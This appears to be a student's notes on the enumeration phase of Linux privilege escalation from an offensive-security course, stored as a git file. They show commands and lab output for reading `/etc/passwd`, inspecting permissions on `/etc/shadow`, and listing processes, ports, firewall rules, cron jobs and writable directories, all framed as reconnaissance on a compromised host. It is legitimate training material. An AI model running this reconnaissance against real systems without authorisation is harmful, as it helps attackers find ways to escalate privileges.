@@ -1,0 +1,2519 @@
+
+    <article class="git-file-panel" data-git-panel-section="blob" data-git-fragment-path="git/cm-blog-content-staging/blob/sources/OffSec/PEN-200 C. 17.md/index.html" data-git-raw-path="git/cm-blog-content-staging/blob/sources/OffSec/PEN-200 C. 17.md/raw.txt" data-git-line-count="2458">
+      <header class="git-file-header">
+        <div class="git-file-header-main">
+          <h4 class="git-file-title">PEN-200 C. 17.md</h4>
+          <div class="git-file-meta">97 KB · 2458 lines · sources/OffSec/PEN-200 C. 17.md</div>
+        </div>
+        <div class="git-file-actions">
+          <a class="git-file-action git-file-action--raw" href="./git/cm-blog-content-staging/blob/sources/OffSec/PEN-200 C. 17.md/raw.txt" target="_blank" rel="noopener">Raw</a>
+          <button type="button" class="git-file-action git-file-action--copy" data-git-file-copy>Copy</button>
+        </div>
+      </header>
+      <div class="git-file-body" data-git-file-body>
+        <hr>
+<h2>title: PEN-200 C. 17
+updated: 2023-11-06 00:10:04Z
+created: 2023-10-29 18:42:55Z
+latitude: 33.91917990
+longitude: -118.41646520
+altitude: 0.0000</h2>
+<h1>Linux Privilege Escalation</h1>
+<ul>
+<li>Enumerating Linux</li>
+<li>Exposed Confidential Information</li>
+<li>Insecure File Permissions</li>
+<li>Abusing System Linux components</li>
+</ul>
+<h2>Enumerating Linux 17.1</h2>
+<ul>
+<li>Understand files and users privileges on Linux</li>
+<li>Perform manual enumeration</li>
+<li>Conduct automated enumeration</li>
+</ul>
+<h3>Understanding Files and Users Privileges on Linux</h3>
+<p>A defining feature of Linux/Unix is that most resources are represented in the FS:</p>
+<ul>
+<li>Files</li>
+<li>Directories</li>
+<li>Devices</li>
+<li>Network communication interfaces</li>
+<li>In essence &quot;everything is a file&quot;</li>
+</ul>
+<p>Every file or element of a Linux system adheres to <a href="https://wiki.archlinux.org/index.php/users_and_groups">user and group</a> permissions with 3 primary properties:</p>
+<ul>
+<li>Read (r)</li>
+<li>Write (w)</li>
+<li>Execute (x)</li>
+</ul>
+<p>Each file/directory has permissions in 3 categories of users:</p>
+<ul>
+<li>owner</li>
+<li>owner group</li>
+<li>others group</li>
+</ul>
+<p>Each perm (rwx) allows authorized users to perform different actions dependent on if the resource is a file or directory.</p>
+<p>For files:</p>
+<ul>
+<li>(r) allows reading file content</li>
+<li>(w) allows changing the content</li>
+<li>(x) allows file execution</li>
+</ul>
+<p>Directories are handles differently:</p>
+<ul>
+<li>(r) right to list the contents</li>
+<li>(w) create or delete files</li>
+<li>(x) allows crossing through dir to access contents using CLI<ul>
+<li>the ability to cross through a dir without read allows the user to access unknown entries, only by knowing their exact names</li>
+</ul>
+</li>
+</ul>
+<p>A simple example of these permissions on our local system:</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ls -l /etc/shadow               
+-rw-r----- 1 root shadow 1510 Aug 26 18:13 /etc/shadow
+</code></pre>
+<ul>
+<li>for each user category 3 different access perms are displayed<ul>
+<li>the first <code>-</code> indicates file type and can be safely ignored</li>
+</ul>
+</li>
+<li>the next 3 are <code>root</code><ul>
+<li><code>rw-</code><ul>
+<li>owner has read, write, no exec</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>the next <code>shadow</code> group owner<ul>
+<li><code>r--</code><ul>
+<li>owner only has read access</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>the <code>others</code> group<ul>
+<li><code>---</code><ul>
+<li>has no rights on the file</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3>Manual Enumeration</h3>
+<p>Although time consuming, manual enumeration allows for a more controlled outcome and identifies lesser known PrivEsc vectors which are often overlooked by automated tools.  Automated enumeration cannot replace manual, the customized settings of our env are most likely to be misconfigured.</p>
+<p>Upon initial access, the first thing we should ID is user context:</p>
+<ul>
+<li>we can use the <code>id</code> command<ul>
+<li><a href="http://man7.org/linux/man-pages/man1/id.1.html">id</a></li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ id
+uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+</code></pre>
+<ul>
+<li>The output shows we are user <code>joe</code></li>
+<li>has (UID) and (GID) of <code>1000</code></li>
+<li>we also have group membership outside of our scope</li>
+</ul>
+<p>To enumerate all users, we can read the contents of <code>/etc/passwd</code>.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+eve:x:1001:1001:,,,:/home/eve:/bin/bash
+lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
+</code></pre>
+<ul>
+<li><code>passwd</code> lists several user accounts<ul>
+<li>including service accounts<ul>
+<li>such as <code>www-data</code> and <code>sshd</code><ul>
+<li>indicating presence of web and ssh server</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>our current user data<ul>
+<li>login name <code>joe</code></li>
+<li>encrypted password <code>x</code><ul>
+<li>typically contains hashed version of user password</li>
+<li><code>x</code> indicated the hash is contained in the <code>/etc/shadows</code> file</li>
+</ul>
+</li>
+<li>UID <code>1000</code><ul>
+<li>root user always has a UID of <code>0</code></li>
+<li>regular users start from <code>1000</code><ul>
+<li>also referred to as the &quot;real user ID&quot;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>GID <code>1000</code><ul>
+<li>the user&#39;s specific Group ID</li>
+</ul>
+</li>
+<li>Comment <code>joe,,,</code><ul>
+<li>description of user</li>
+<li>often repeats username info</li>
+</ul>
+</li>
+<li>Home folder <code>/home/joe</code><ul>
+<li>describes user home directory prompted at login</li>
+</ul>
+</li>
+<li>Login shell <code>/bin/bash</code><ul>
+<li>indicates default interactive shell, if exists</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Other than our user <code>joe</code>, we find a user <code>eve</code> and can infer they are a standard user since the configured home folder is <code>/home/eve</code>.  System service homes are configured with <code>/usr/sbin/nologin</code> as shell, where <code>nologin</code> statement is used to block remote/local login of service account.</p>
+<p>Enumerating all users of the target system helps ID potentially high-priv user accounts we may want to target in PrivEsc attempts.</p>
+<p>The next item we want to note is the machine&#39;s <code>hostname</code>, which often provide clues about the functional role of the machine.  Abbreviations such as web, db, or dc can indicated to us the system&#39;s purpose.</p>
+<p>On most Linux distros, the hostname will be shown in the command prompt, but we should always rely on system commands since the prompt text can be manipulated.</p>
+<p>We can use the <code>hostname</code> command to retrieve this:</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ hostname
+debian-privesc
+</code></pre>
+<ul>
+<li>enterpises often have enforced hostname naming convention schemes for categorizing by location, description, OS, and service level.</li>
+<li>In our case, the hostname is two parts<ul>
+<li>OS type</li>
+<li>description</li>
+</ul>
+</li>
+<li>the role of a machine can help us focus our info gathering by adding context around the host</li>
+</ul>
+<p>During the PrivEsc process we may need kernel exploits to leverage core OS vulns.  This class of exploit is built for very specific types of targets, specified by OS and version combo.  Attacking a target with a mismatched kernel exploit can lead to system error or crash, we must gather precise info about the target before selecting an exploit.</p>
+<p><em>During the PrivEsc process we may need kernel exploits to leverage core OS vulns.  This class of exploit is built for very specific types of targets, specified by OS and version combo.  Attacking a target with a mismatched kernel exploit can lead to system error or crash, we must gather precise info about the target before selecting an exploit.</em></p>
+<p>To obtain system info we can review:</p>
+<ul>
+<li><code>/etc/issue</code></li>
+<li><code>/etc/*-release</code></li>
+<li>run <code>uname -a</code></li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat /etc/issue &amp;&amp; cat /etc/*-release &amp;&amp; uname -a
+Debian GNU/Linux 10 \n \l
+
+PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;
+NAME=&quot;Debian GNU/Linux&quot;
+VERSION_ID=&quot;10&quot;
+VERSION=&quot;10 (buster)&quot;
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL=&quot;https://www.debian.org/&quot;
+SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux
+</code></pre>
+<ul>
+<li><code>issue</code> and <code>os-release</code> foles in <code>/etc</code> contain<ul>
+<li>OS version</li>
+<li>release-specific info<ul>
+<li>including distro code name</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>uname -a</code> outputs<ul>
+<li>kernel version</li>
+<li>architecture</li>
+</ul>
+</li>
+</ul>
+<p>Next we explore running processes and services that may allow PrivEsc.  For this:</p>
+<ul>
+<li>the proc must run in the context of a priv account</li>
+<li>must have either<ul>
+<li>insecure perms</li>
+<li>allow us to interact with it in unintended ways</li>
+</ul>
+</li>
+<li>we can list sys procs, included those run by priv user, with <code>ps</code><ul>
+<li>use flags<ul>
+<li><code>a</code> and <code>x</code> to list procs with and without a <a href="https://www.linusakesson.net/programming/tty/">TTY</a></li>
+<li><code>u</code> user-readable format</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.5 169596 10332 ?        Ss   14:16   0:03 /sbin/init
+...
+colord     811  0.0  0.6 246964 12312 ?        Ssl  14:16   0:00 /usr/lib/colord/colord
+www-data   988  0.0  0.1  11480  3756 ?        S    14:19   0:00 /usr/sbin/apache2 -k sta
+www-data   989  0.0  0.3 1216084 6428 ?        Sl   14:19   0:00 /usr/sbin/apache2 -k sta
+www-data   990  0.0  0.4 1216084 8468 ?        Sl   14:19   0:00 /usr/sbin/apache2 -k sta
+root      1052  0.0  0.3  27160  8124 ?        Ss   14:19   0:00 /usr/sbin/cupsd -l
+root      1053  0.0  0.5 176748 10860 ?        Ssl  14:19   0:00 /usr/sbin/cups-browsed
+systemd+  1186  0.0  0.3  20956  6652 ?        Ss   14:19   0:00 /lib/systemd/systemd-net
+root      1697  0.0  0.3  14648  7996 ?        Ss   14:23   0:00 sshd: joe [priv]
+joe       1702  0.0  0.4  21168  9276 ?        Ss   14:23   0:00 /lib/systemd/systemd --u
+joe       1703  0.0  0.1 170896  2564 ?        S    14:23   0:00 (sd-pam)
+joe       1717  0.0  0.2  14932  6092 ?        S    14:23   0:00 sshd: joe@pts/0
+joe       1718  0.0  0.2   8236  5056 pts/0    Ss   14:23   0:00 -bash
+root      4191  0.0  0.0      0     0 ?        I    14:43   0:00 [kworker/0:0-events_powe
+root      4916  0.0  0.0      0     0 ?        I    14:49   0:00 [kworker/0:3-ata_sff]
+root      6168  0.0  0.0      0     0 ?        I    15:00   0:00 [kworker/u4:1-events_unb
+root      6170  0.0  0.0      0     0 ?        I    15:00   0:00 [kworker/1:3-cgroup_dest
+root      6857  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/1:0-cgroup_dest
+root      8068  0.0  0.0      0     0 ?        I    15:16   0:00 [kworker/1:1-events]
+root      8136  0.0  0.0      0     0 ?        I    15:17   0:00 [kworker/u4:2-events_unb
+root      8322  0.0  0.0      0     0 ?        I    15:18   0:00 [kworker/0:2-cgroup_dest
+root      8729  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/u4:0-events_unb
+root      8731  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/1:2-cgroup_dest
+eve       8926  0.1  0.4  21168  9040 ?        Ss   15:24   0:00 /lib/systemd/systemd --u
+eve       8927  0.0  0.1 170896  2604 ?        S    15:24   0:00 (sd-pam)
+joe       8949  0.0  0.1  10628  3136 pts/0    R+   15:24   0:00 ps aux
+</code></pre>
+<ul>
+<li>the output shows several <code>root</code> owned services we should research</li>
+<li>the <code>ps</code> command we ran is also listed in the output owned by our current user<ul>
+<li>we can filter specific user-owned procs</li>
+</ul>
+</li>
+</ul>
+<p>Next we will review the network interfaces, routes, and open ports of the target sys.  This allows us to determine if the target is connected to multiple networks and could potentially be used to pivot.  Presence of virtual ifaces may indicated the existence of virtualization or AV software.</p>
+<p><em>An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly reachable from the original attack machine.</em></p>
+<p>Port bindings can tell us if a running service is only available on a loopback address instead of a routable iface.  A privileged service running on a LO iface could expand our attack surface and increase probability of PrivEsc success.</p>
+<p>Depending on the Linux version we can list TCP/IP config of network adapters with <code>ipconfig</code> or <code>ip</code>, both accept the <code>a</code> flag to display all available info.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+4: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:bf:fa:39 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.188.214/24 brd 192.168.188.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:bf:0b:7d brd ff:ff:ff:ff:ff:ff
+    inet 172.16.128.214/24 brd 172.16.128.255 scope global ens224
+       valid_lft forever preferred_lft forever
+</code></pre>
+<ul>
+<li>based on this output, we see the system connects to more than one network</li>
+</ul>
+<p>We can display routing tables with <code>route</code> or <code>routel</code>.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ routel
+         target            gateway          source    proto    scope    dev tbl
+        default    192.168.188.254                   static          ens192 
+   172.16.128.0 24                  172.16.128.214   kernel     link ens224 
+  192.168.188.0 24                 192.168.188.214   kernel     link ens192 
+      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
+      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
+      127.0.0.1              local       127.0.0.1   kernel     host     lo local
+127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
+   172.16.128.0          broadcast  172.16.128.214   kernel     link ens224 local
+ 172.16.128.214              local  172.16.128.214   kernel     host ens224 local
+ 172.16.128.255          broadcast  172.16.128.214   kernel     link ens224 local
+  192.168.188.0          broadcast 192.168.188.214   kernel     link ens192 local
+192.168.188.214              local 192.168.188.214   kernel     host ens192 local
+192.168.188.255          broadcast 192.168.188.214   kernel     link ens192 local
+</code></pre>
+<p>We can display active network connections and listening ports with <code>netstat</code> or <code>ss</code>, which both accept the same arguments.</p>
+<ul>
+<li>list all connections <code>-a</code></li>
+<li>avoid hostname resolution <code>-n</code></li>
+<li>list proc name the conn belongs to with <code>-p</code></li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ ss -anp
+Netid  State      Recv-Q  Send-Q                              Local Address:Port              Peer Address:Port                                                                   
+nl     UNCONN     0       0                                               0:466                           *                                                                       
+...                                                                      
+udp    UNCONN     0       0                                            [::]:5353                      [::]:*                                                                      
+tcp    LISTEN     0       128                                       0.0.0.0:80                     0.0.0.0:*                                                                      
+tcp    LISTEN     0       128                                       0.0.0.0:22                     0.0.0.0:*                                                                      
+tcp    LISTEN     0       5                                       127.0.0.1:631                    0.0.0.0:*                                                                      
+tcp    ESTAB      0       36                                192.168.188.214:22              192.168.45.182:37184                                                                  
+tcp    TIME-WAIT  0       0                                       127.0.0.1:43288                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:40600                127.0.0.1:22                                                                     
+tcp    TIME-WAIT  0       0                                       127.0.0.1:43416                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:41066                127.0.0.1:22                                                                     
+tcp    TIME-WAIT  0       0                                       127.0.0.1:34284                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:58016                127.0.0.1:22                                                                     
+tcp    TIME-WAIT  0       0                                       127.0.0.1:40866                127.0.0.1:4444                                                                   
+tcp    TIME-WAIT  0       0                                       127.0.0.1:36032                127.0.0.1:22                                                                     
+tcp    LISTEN     0       128                                          [::]:22                        [::]:*                                                                      
+v_str  ESTAB      0       0                                      2659772525:1023                         0:976
+</code></pre>
+<ul>
+<li>output shows various listening ports and active sessions<ul>
+<li>including our SSH session and listening socket</li>
+</ul>
+</li>
+</ul>
+<p>Next we inspect firewall rules.  Generally we are interested in the firewall state, profile, and rules during the remote exploitation phase, but this info can also be useful during PrivEsc.  Example, if a network service is not remotely accessible we can likely access it via the lo iface.  If we can interact with those service locally, we can attempt to exploit them for PrivEsc.</p>
+<p>We should also father info about in/out-bound port filters to support port forwarding/tunneling when we need to pivot to an internal network.</p>
+<p>On Linux, we need root to list firewall rules with IPtables.  Depending on how the firsway is configured, we may be able to obtain some some info as a standard user.</p>
+<p>The <code>iptables-persistent</code> Debian package save firewall rules in certain files under <code>/etc/iptables/</code> by default and uses them to restore <code>netfilter</code> rules at boot time.  These files often have weak perms, allowing a local user to read them.</p>
+<p>We can also search for <code>iptables-save</code> created files, which dumps the firewall conf to a user specified file.  This file is then used as input to the <code>iptables-restore</code> command, restoring firewall rules at next boot.  If an admin has ever run this command, we could search <code>/etc</code> or grep the FS for <code>iptables</code> commands to locate them.  If the file perms are weak, we can read them to infer firewall rules in use on the system.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat /etc/iptables/rules.v4 
+# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
+COMMIT
+# Completed on Thu Aug 18 12:53:22 2022
+</code></pre>
+<ul>
+<li>since the file is RO by users other than root, we can inspect it</li>
+<li>notice the non-default rule explicitly allowing the dest port 1999<ul>
+<li>this should be noted for further inspection</li>
+</ul>
+</li>
+</ul>
+<p>Next we examine scheduled tasks, commonly leveraged during PrivEsc.  Server systems often execute automated scheduled tasks.  When misconfigured or user created file perms are weak, we can modify the files that will be exec by the scheduling system with high level of priv.</p>
+<p>The Linux job scheduler is called <code>cron</code>.  Tasks are listed under <code>/etc/cron.*</code> dirs, where <code>*</code> represents the frequency the task runs at.  For instance, daily tasks will be stored under <code>/etc/cron.daily</code>, each script is listed in its own subdir.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ ls -lah /etc/cron*
+-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab
+
+/etc/cron.d:
+total 24K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rw-r--r--   1 root root  285 May 19  2019 anacron
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.daily:
+total 60K
+drwxr-xr-x   2 root root 4.0K Aug 18  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
+-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
+-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
+-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
+-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
+-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
+-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
+-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
+-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.hourly:
+total 20K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.monthly:
+total 24K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rwxr-xr-x   1 root root  313 May 19  2019 0anacron
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.weekly:
+total 28K
+drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
+drwxr-xr-x 125 root root  12K Feb 15  2023 ..
+-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
+-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+</code></pre>
+<ul>
+<li>we find several daily tasks</li>
+</ul>
+<p>Note that sys admins often add their own sched tasks to <code>/etc/crontab</code> and they should be inspected carefully for weak perms.  Most jobs will run as root.  They can be viewed with <code>crontab -l</code>.  Running the command with <code>sudo</code> will show a root <code>crontab</code>.  Always check both user and root crontab.</p>
+<pre><code># m h  dom mon dow   command
+* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
+</code></pre>
+<ul>
+<li>we find a backup job in the root crontab<ul>
+<li>if the script perms are weak, we can leverage it for PrivEsc</li>
+<li><em>As we&#39;ll learn later in this Module, the joe user has been granted specific sudo permission only to list cron jobs running as the root user. This permission alone cannot be abused to obtain a root shell.</em></li>
+</ul>
+</li>
+</ul>
+<p>We will at some point need to leverage exploits to achieve PrivEsc.  In this case we must start with enumerating the installed apps and versions, to search for matching exploits.</p>
+<p>Manually searching app info can be time consuming, we will learn how to automate this, but we should know how to manually query installed packages as needed.</p>
+<p>Linux distros use many different package managers.  Debian based distros use <code>dpkg</code> whereas Red Hat uses <code>rpm</code>.  To list packages on Debian we ues <code>dpkg -l</code>.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ dpkg -l
+Desired=Unknown/Install/Remove/Purge/Hold
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
+||/ Name                                  Version                                      Ar
++++-=====================================-============================================-==
+ii  accountsservice                       0.6.45-2                                     am
+ii  acl                                   2.2.53-4                                     am
+ii  adduser                               3.118                                        al
+ii  adwaita-icon-theme                    3.30.1-1                                     al
+ii  aisleriot                             1:3.22.7-2                                   am
+ii  alsa-utils                            1.1.8-2                                      am
+ii  anacron                               2.3-28                                       am
+ii  analog                                2:6.0-22                                     am
+ii  apache2                               2.4.38-3+deb10u7                             am
+ii  apache2-bin                           2.4.38-3+deb10u7                             am
+ii  apache2-data                          2.4.38-3+deb10u7                             al
+ii  apache2-doc                           2.4.38-3+deb10u7                             al
+ii  apache2-utils                         2.4.38-3+deb10u7                             am
+</code></pre>
+<ul>
+<li>this confirms our expectation from enumerating open ports, this machine runs a web server<ul>
+<li>in this case <code>Apache2</code></li>
+</ul>
+</li>
+</ul>
+<p>As we know, files with insufficient access restrictions can create a vuln that may grant an attacker elevated privs.  This can happen when an attacker can modify scripts or binaries that are executed under the context of a privileged account.</p>
+<p>Sensitive files that are readable by an unpriv user can also contain important info such as creds to DBs or service accounts running with elevated privs.</p>
+<p>It is not feasible to manually check the perms of each file and dir, we must automate this task.  To start, we can use <code>find</code> to ID files with insecure perms.  We can search for every dir writable by current user on the target with flags:</p>
+<ul>
+<li><code>/</code> to search the entire root</li>
+<li><code>-writable</code> to specify attribute</li>
+<li><code>type d</code> for dirs</li>
+<li><code>2&gt;/dev/null</code> to filter errors</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ find / -writable -type d 2&gt;/dev/null
+/run/user/1000
+/run/user/1000/pulse
+/run/user/1000/gnupg
+/run/user/1000/systemd
+/run/lock
+/home/joe
+/home/joe/Videos
+/home/joe/Templates
+/home/joe/.local
+/home/joe/.local/share
+/home/joe/.local/share/sounds
+/home/joe/.local/share/evolution
+/home/joe/.local/share/evolution/tasks
+/home/joe/.local/share/evolution/tasks/system
+/home/joe/.local/share/evolution/tasks/trash
+/home/joe/.local/share/evolution/addressbook
+/home/joe/.local/share/evolution/addressbook/system
+/home/joe/.local/share/evolution/addressbook/system/photos
+/home/joe/.local/share/evolution/addressbook/trash
+/home/joe/.local/share/evolution/mail
+/home/joe/.local/share/evolution/mail/trash
+/home/joe/.local/share/evolution/memos
+/home/joe/.local/share/evolution/memos/system
+/home/joe/.local/share/evolution/memos/trash
+/home/joe/.local/share/evolution/calendar
+/home/joe/.local/share/evolution/calendar/system
+/home/joe/.local/share/evolution/calendar/trash
+/home/joe/.local/share/icc
+/home/joe/.local/share/gnome-shell
+/home/joe/.local/share/gnome-settings-daemon
+/home/joe/.local/share/keyrings
+/home/joe/.local/share/tracker
+/home/joe/.local/share/tracker/data
+/home/joe/.local/share/folks
+/home/joe/.local/share/gvfs-metadata
+/home/joe/.local/share/applications
+/home/joe/.local/share/nano
+/home/joe/Downloads
+/home/joe/.scripts
+/home/joe/Pictures
+/home/joe/.cache
+/home/joe/.cache/gnome-calculator
+/home/joe/.cache/evolution
+/home/joe/.cache/evolution/tasks
+/home/joe/.cache/evolution/tasks/trash
+/home/joe/.cache/evolution/sources
+/home/joe/.cache/evolution/sources/trash
+/home/joe/.cache/evolution/addressbook
+/home/joe/.cache/evolution/addressbook/trash
+/home/joe/.cache/evolution/mail
+/home/joe/.cache/evolution/mail/trash
+/home/joe/.cache/evolution/memos
+/home/joe/.cache/evolution/memos/trash
+/home/joe/.cache/evolution/calendar
+/home/joe/.cache/evolution/calendar/trash
+/home/joe/.cache/libgweather
+/home/joe/.cache/tracker
+/home/joe/.cache/folks
+/home/joe/.cache/folks/avatars
+/home/joe/.cache/obexd
+/home/joe/.cache/gnome-software
+/home/joe/.cache/gnome-software/fwupd
+/home/joe/.cache/gnome-software/fwupd/remotes.d
+/home/joe/.cache/gnome-software/fwupd/remotes.d/lvfs
+/home/joe/.cache/gnome-software/odrs
+/home/joe/.cache/gnome-software/shell-extensions
+/home/joe/.cache/gstreamer-1.0
+/home/joe/Documents
+/home/joe/.gnupg
+/home/joe/.gnupg/private-keys-v1.d
+/home/joe/Music
+/home/joe/Desktop
+/home/joe/.config
+/home/joe/.config/ibus
+/home/joe/.config/ibus/bus
+/home/joe/.config/evolution
+/home/joe/.config/evolution/sources
+/home/joe/.config/gnome-session
+/home/joe/.config/gnome-session/saved-session
+/home/joe/.config/gtk-3.0
+/home/joe/.config/dconf
+/home/joe/.config/procps
+/home/joe/.config/pulse
+/home/joe/.config/goa-1.0
+/home/joe/.config/nautilus
+/home/joe/.ssh
+/home/joe/Public
+/tmp
+/tmp/.XIM-unix
+/tmp/.Test-unix
+/tmp/.ICE-unix
+/tmp/.X11-unix
+/tmp/.font-unix
+/proc/6784/task/6784/fd
+/proc/6784/fd
+/proc/6784/map_files
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
